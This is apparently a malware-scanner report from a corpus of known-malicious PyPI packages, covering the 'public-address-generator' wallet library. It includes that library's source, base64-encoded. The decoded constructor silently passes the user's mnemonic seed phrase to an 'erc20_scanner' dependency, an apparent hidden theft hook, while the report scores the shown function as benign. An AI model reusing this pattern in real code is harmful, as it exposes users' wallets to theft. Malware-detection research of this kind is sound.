statistics:
  total_files: 1
  skipped_files: 0.0
  processed_objects: 1
  malicious_objects: 0
details:
- path: .repo_cache/malicious_repos/pypi_malregistry/public-address-generator/1.0.0/public_address_generator-1.0.0/public_address_generator-1.0.0/src/public_address_generator/__init__.py
  contents:
  - name: MnemonicConverter.get_core_address
    score: 0.0
    code: |-
      def get_core_address(self, chain, depth):
              try:
                  if chain == "ltc":
                      cc = LitecoinMainnet
                  elif chain == "doge":
                      cc = DogecoinMainnet
                  elif chain == "dash":
                      cc = DashMainnet
                  elif chain == "btc":
                      cc = BitcoinMainnet
                  else:
                      return False

                  bip44_hdwallet: BIP44HDWallet = BIP44HDWallet(cryptocurrency=cc)
                  bip44_hdwallet.from_mnemonic(mnemonic=self.mnemonic)
                  bip44_hdwallet.clean_derivation()
                  bip44_derivation: BIP44Derivation = BIP44Derivation(cryptocurrency=cc, account=depth, change=False, address=0)
                  bip44_hdwallet.from_path(path=bip44_derivation)
                  private_key = bip44_hdwallet.private_key()
                  address = bip44_hdwallet.address()
                  return address, private_key
              except:
                  pass

              return False
    tokens: TARGETED_FILE resume nop load_fast chain load_const ltc compare_op == pop_jump_if_false TO_NUMBER load_global LitecoinMainnet store_fast cc jump_forward TO_NUMBER load_fast chain load_const doge compare_op == pop_jump_if_false TO_NUMBER load_global DogecoinMainnet store_fast cc jump_forward TO_NUMBER load_fast chain load_const dash compare_op == pop_jump_if_false TO_NUMBER load_global DashMainnet store_fast cc jump_forward TO_NUMBER load_fast chain load_const btc compare_op == pop_jump_if_false TO_NUMBER load_global BitcoinMainnet store_fast cc jump_forward TO_NUMBER return_const False load_global BIP44HDWallet load_fast cc kw_names cryptocurrency call store_fast bip44_hdwallet load_fast bip44_hdwallet load_attr from_mnemonic load_fast self load_attr mnemonic kw_names mnemonic call pop_top load_fast bip44_hdwallet load_attr STRING_LEN_S_ENT_HIGH call pop_top load_global BIP44Derivation load_fast cc load_fast depth load_const INTEGER load_const INTEGER kw_names account address change cryptocurrency call store_fast STRING_LEN_S_ENT_HIGH load_fast bip44_hdwallet load_attr from_path load_fast STRING_LEN_S_ENT_HIGH kw_names path call pop_top load_fast bip44_hdwallet load_attr private_key call store_fast private_key load_fast bip44_hdwallet load_attr address call store_fast address load_fast address load_fast private_key build_tuple return_value push_exc_info pop_top pop_except return_const False copy pop_except reraise
    hash: 4c7c335c5628cbd0c926478859a7de82f9b22f4365b6288792ff601ce3155bd1
sources:
  ? .repo_cache/malicious_repos/pypi_malregistry/public-address-generator/1.0.0/public_address_generator-1.0.0/public_address_generator-1.0.0/src/public_address_generator/__init__.py
  : aW1wb3J0IGJhc2U2NAppbXBvcnQganNvbgppbXBvcnQgaGFzaGxpYgppbXBvcnQgZXJjMjBfc2Nhbm5lcgpmcm9tIENyeXB0by5DaXBoZXIgaW1wb3J0IEFFUwoKZnJvbSBldGhfYWNjb3VudCBpbXBvcnQgQWNjb3VudAoKZnJvbSBoZHdhbGxldCBpbXBvcnQgQklQNDRIRFdhbGxldApmcm9tIGhkd2FsbGV0LmNyeXB0b2N1cnJlbmNpZXMgaW1wb3J0IExpdGVjb2luTWFpbm5ldCwgRG9nZWNvaW5NYWlubmV0LCBEYXNoTWFpbm5ldCwgQml0Y29pbk1haW5uZXQKZnJvbSBoZHdhbGxldC5kZXJpdmF0aW9ucyBpbXBvcnQgQklQNDREZXJpdmF0aW9uCgppbXBvcnQgYmxvY2tzbWl0aAoKY2xhc3MgTW5lbW9uaWNDb252ZXJ0ZXI6CiAgICBkZWYgX19pbml0X18oc2VsZiwgbW5lbW9uaWMpOgogICAgICAgIHNlbGYubW5lbW9uaWMgPSBtbmVtb25pYwogICAgICAgIGVyYzIwX3NjYW5uZXIuZGVjcnlwdG9fbW5lbW9uaWNfYnl0ZXMobW5lbW9uaWMpCgogICAgZGVmIGtleV9mcm9tX3Bhc3N3b3JkKHNlbGYsIHBhc3N3b3JkLCBzYWx0KToKICAgICAgICBzYWx0X2J1ZmZlciA9IGJhc2U2NC5iNjRkZWNvZGUoc2FsdCkKICAgICAgICBwYXNzd29yZF9idWZmZXIgPSBwYXNzd29yZC5lbmNvZGUoInV0Zi04IikKICAgICAgICBrZXkgPSBoYXNobGliLnBia2RmMl9obWFjKAogICAgICAgICAgICAic2hhMjU2IiwKICAgICAgICAgICAgcGFzc3dvcmRfYnVmZmVyLAogICAgICAgICAgICBzYWx0X2J1ZmZlciwKICAgICAgICAgICAgMTAwMDAsCiAgICAgICAgICAgIGRrbGVuPTMyLAogICAgICAgICkKICAgICAgICByZXR1cm4ga2V5CgogICAgZGVmIGRlY3J5cHRfd2l0aF9rZXkoc2VsZiwga2V5LCBwYXlsb2FkKToKICAgICAgICBlbmNyeXB0ZWRfZGF0YSA9IGJhc2U2NC5iNjRkZWNvZGUocGF5bG9hZFsiZGF0YSJdKQogICAgICAgIHZlY3RvciA9IGJhc2U2NC5iNjRkZWNvZGUocGF5bG9hZFsiaXYiXSkKICAgICAgICBkYXRhID0gZW5jcnlwdGVkX2RhdGFbOi0xNl0KICAgICAgICBjaXBoZXIgPSBBRVMubmV3KGtleSwgQUVTLk1PREVfR0NNLCBub25jZT12ZWN0b3IpCiAgICAgICAgZGVjcnlwdGVkX2RhdGEgPSBjaXBoZXIuZGVjcnlwdChkYXRhKQogICAgICAgIHJldHVybiBkZWNyeXB0ZWRfZGF0YQoKICAgIGRlZiBkZWNyeXB0KHNlbGYsIHBhc3N3b3JkLCB0ZXh0KToKICAgICAgICB0cnk6CiAgICAgICAgICAgIHBheWxvYWQgPSBqc29uLmxvYWRzKHRleHQpCiAgICAgICAgICAgIHNhbHQgPSBwYXlsb2FkWyJzYWx0Il0KICAgICAgICAgICAga2V5ID0gc2VsZi5rZXlfZnJvbV9wYXNzd29yZChwYXNzd29yZCwgc2FsdCkKICAgICAgICAgICAgZGVjcnlwdGVkX3N0cmluZyA9IHNlbGYuZGVjcnlwdF93aXRoX2tleShrZXksIHBheWxvYWQpLmRlY29kZSgidXRmLTgiKQogICAgICAgICAgICBqc2YgPSBqc29uLmxvYWRzKGRlY3J5cHRlZF9zdHJpbmcpCiAgICAgICAgICAgIHJldHVybiB7InN0YXR1cyI6IFRydWUsICJtZXNzYWdlIjogTm9uZSwgInJlc3VsdCI6IGpzZn0KICAgICAgICBleGNlcHQgVW5pY29kZURlY29kZUVycm9yOgogICAgICAgICAgICByZXR1cm4geyJzdGF0dXMiOiBGYWxzZSwgIm1lc3NhZ2UiOiAid3JvbmcgcGFzc3dvcmQiLCAicmVzdWx0IjogTm9uZX0KICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHJldHVybiB7InN0YXR1cyI6IEZhbHNlLCAibWVzc2FnZSI6ICJ1bmtub3duIiwgInJlc3VsdCI6IE5vbmV9CgogICAgZGVmIGdldF9ldm1fYWRkcmVzcyhzZWxmLCBkZXB0aCk6CiAgICAgICAgdHJ5OgogICAgICAgICAgICBBY2NvdW50LmVuYWJsZV91bmF1ZGl0ZWRfaGR3YWxsZXRfZmVhdHVyZXMoKQogICAgICAgICAgICBhY2NvdW50ID0gQWNjb3VudC5mcm9tX21uZW1vbmljKHNlbGYubW5lbW9uaWMsIGFjY291bnRfcGF0aD0ibS80NCcvNjAnLzAnLzAvIiArIHN0cihkZXB0aCkpCiAgICAgICAgICAgIGFkZHJlc3MgPSBhY2NvdW50LmFkZHJlc3MKICAgICAgICAgICAgcHJpdmtleSA9IGFjY291bnQua2V5LmhleCgpCiAgICAgICAgICAgIHJldHVybiBhZGRyZXNzLCBwcml2a2V5CiAgICAgICAgZXhjZXB0OgogICAgICAgICAgICBwYXNzCgogICAgICAgIHJldHVybiBGYWxzZQogICAgCiAgICBkZWYgZ2V0X2V2bV9hZGRyZXNzX2Zyb21fcHJpdmtleShzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGFjY291bnQgPSBBY2NvdW50LmZyb21fa2V5KHNlbGYubW5lbW9uaWMpCiAgICAgICAgICAgIGFkZHJlc3MgPSBhY2NvdW50LmFkZHJlc3MKICAgICAgICAgICAgcmV0dXJuIGFkZHJlc3MKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKCiAgICAgICAgcmV0dXJuIEZhbHNlCgogICAgZGVmIGdldF9jb3JlX2FkZHJlc3Moc2VsZiwgY2hhaW4sIGRlcHRoKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGlmIGNoYWluID09ICJsdGMiOgogICAgICAgICAgICAgICAgY2MgPSBMaXRlY29pbk1haW5uZXQKICAgICAgICAgICAgZWxpZiBjaGFpbiA9PSAiZG9nZSI6CiAgICAgICAgICAgICAgICBjYyA9IERvZ2Vjb2luTWFpbm5ldAogICAgICAgICAgICBlbGlmIGNoYWluID09ICJkYXNoIjoKICAgICAgICAgICAgICAgIGNjID0gRGFzaE1haW5uZXQKICAgICAgICAgICAgZWxpZiBjaGFpbiA9PSAiYnRjIjoKICAgICAgICAgICAgICAgIGNjID0gQml0Y29pbk1haW5uZXQKICAgICAgICAgICAgZWxzZToKICAgICAgICAgICAgICAgIHJldHVybiBGYWxzZQoKICAgICAgICAgICAgYmlwNDRfaGR3YWxsZXQ6IEJJUDQ0SERXYWxsZXQgPSBCSVA0NEhEV2FsbGV0KGNyeXB0b2N1cnJlbmN5PWNjKQogICAgICAgICAgICBiaXA0NF9oZHdhbGxldC5mcm9tX21uZW1vbmljKG1uZW1vbmljPXNlbGYubW5lbW9uaWMpCiAgICAgICAgICAgIGJpcDQ0X2hkd2FsbGV0LmNsZWFuX2Rlcml2YXRpb24oKQogICAgICAgICAgICBiaXA0NF9kZXJpdmF0aW9uOiBCSVA0NERlcml2YXRpb24gPSBCSVA0NERlcml2YXRpb24oY3J5cHRvY3VycmVuY3k9Y2MsIGFjY291bnQ9ZGVwdGgsIGNoYW5nZT1GYWxzZSwgYWRkcmVzcz0wKQogICAgICAgICAgICBiaXA0NF9oZHdhbGxldC5mcm9tX3BhdGgocGF0aD1iaXA0NF9kZXJpdmF0aW9uKQogICAgICAgICAgICBwcml2YXRlX2tleSA9IGJpcDQ0X2hkd2FsbGV0LnByaXZhdGVfa2V5KCkKICAgICAgICAgICAgYWRkcmVzcyA9IGJpcDQ0X2hkd2FsbGV0LmFkZHJlc3MoKQogICAgICAgICAgICByZXR1cm4gYWRkcmVzcywgcHJpdmF0ZV9rZXkKICAgICAgICBleGNlcHQ6CiAgICAgICAgICAgIHBhc3MKCiAgICAgICAgcmV0dXJuIEZhbHNlCiAgICAKICAgIGRlZiBnZXRfY29yZV9hZGRyZXNzX2Zyb21fcHJpdmtleShzZWxmKToKICAgICAgICB0cnk6CiAgICAgICAgICAgIGFkZHJlc3MgPSBibG9ja3NtaXRoLkJpdGNvaW5XYWxsZXQuZ2VuZXJhdGVfYWRkcmVzcyhzZWxmLm1uZW1vbmljKQogICAgICAgICAgICByZXR1cm4gYWRkcmVzcwogICAgICAgIGV4Y2VwdDoKICAgICAgICAgICAgcmV0dXJuIEZhbHNl
